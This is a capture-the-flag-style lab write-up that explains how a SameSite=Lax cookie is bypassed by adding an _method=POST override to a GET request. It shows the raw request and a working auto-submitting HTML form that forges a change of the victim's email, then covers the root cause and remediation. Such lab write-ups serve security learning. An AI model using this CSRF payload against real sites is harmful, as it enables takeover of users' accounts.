# SameSite Lax Bypass via Method Override

## Description

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. The provided exploit server was used to host the attack.

You can log in to your own account using the following credentials: `wiener:peter`.

## Solution

### Step 1: Log in and inspect the change email request

I logged in using the given credentials `wiener:peter` and navigated to `My account`. Changing the email address there sent a `POST /my-account/change-email` request carrying the `session` cookie.

### Step 2: Check the session cookie's SameSite attribute

Inspecting the `Set-Cookie` header for the `session` cookie showed its `SameSite` attribute was set to `""` (empty). Browsers treat an empty/unspecified `SameSite` attribute as `Lax` by default. Under `Lax`, the cookie is withheld on cross-site subrequests (like a background `POST` from an attacker's page), but it **is** still sent on top-level, "safe" cross-site navigations, most notably a plain `GET` request. This meant a standard cross-site auto-submitting POST form wouldn't carry the session cookie, so a normal CSRF PoC would fail here.

### Step 3: Test a GET-based method override

Since the endpoint only accepted `POST` for changing the email, I needed a way to trigger the same action via a top-level `GET` navigation so the `Lax` cookie would still be attached. I tested whether the application supported an `_method` override parameter — a common pattern where frameworks let a `GET` request be re-interpreted as another HTTP method if `_method` is supplied as a query parameter.

I sent the following request directly:

```
GET /my-account/change-email?email=test%40test.com&_method=POST HTTP/2
Host: 0a2600b6046c71c48054034f0075003a.web-security-academy.net
Cookie: session=cdesYzhVIIBprMa4idFtXkvZ6Ts5ZGl8
Cache-Control: max-age=0
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: https://0a2600b6046c71c48054034f0075003a.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a2600b6046c71c48054034f0075003a.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
```

I added the `_method=POST` parameter myself and sent the final request. The email was updated to `test@test.com`, confirming that the server accepted the `_method` override and processed the `GET` request as if it were the `POST` change-email request. This is the missing piece: a `GET` request satisfies `SameSite=Lax`'s top-level-navigation exception, while `_method=POST` satisfies the server's requirement that the action be a `POST`.

### Step 4: Build the CSRF exploit

With both constraints solved, I built an HTML page that auto-submits a form to the change-email endpoint. The form deliberately omits a `method` attribute, so it defaults to `GET` — which is what makes the browser treat the submission as a top-level navigation and attach the `Lax` session cookie cross-site:

```html
<html>
<form enctype="application/x-www-form-urlencoded" action="https://0a2600b6046c71c48054034f0075003a.web-security-academy.net/my-account/change-email">
  <table>
    <tr>
      <td>email</td>
      <td>
        <input type="text" value="hacked@tt.com" name="email">
        <input type="text" value="POST" name="_method">
      </td>
    </tr>
  </table>
  <input type="submit" value="https://0a2600b6046c71c48054034f0075003a.web-security-academy.net/my-account/change-email">
</form>
<script>
  document.forms[0].submit();
</script>
</html>
```

### Step 5: Host and deliver the exploit

I pasted this into the exploit server's body, stored it, and clicked `Deliver to victim`. When the victim's browser loaded the page, the form auto-submitted as a `GET` request to `/my-account/change-email?email=hacked%40tt.com&_method=POST`, carrying the victim's `Lax` session cookie along on that top-level navigation. The server honored `_method=POST` and processed it as a change-email `POST` request, updating the victim's email to `hacked@tt.com` and solving the lab.

## Root Cause

The `session` cookie relied entirely on the default `SameSite=Lax` behavior for CSRF protection, without any additional token-based defense. This is only effective against forged **state-changing subrequests**, not top-level `GET` navigations. The application then undermined even that partial protection by supporting an `_method` override parameter, which let a `GET` request perform an action that was supposed to require `POST`. Combining these two facts turned a `Lax`-protected `POST`-only endpoint into something triggerable by a simple cross-site `GET` navigation.

## Remediation

- Do not rely on `SameSite` cookie attributes as the sole CSRF defense; use dedicated, unpredictable, per-session anti-CSRF tokens validated on every state-changing request.
- Disable or strictly gate HTTP method-override functionality (`_method`, `X-HTTP-Method-Override`, etc.), especially for anything that changes account/session state. If it's required, only allow it on requests that already meet the same authentication/CSRF checks as the real method.
- Prefer `SameSite=Strict` for sensitive session cookies where cross-site top-level navigation isn't a legitimate use case.
- Ensure state-changing actions are never reachable via `GET`, even indirectly through overrides, since `GET` requests are treated as "safe" by browsers, proxies, and caches.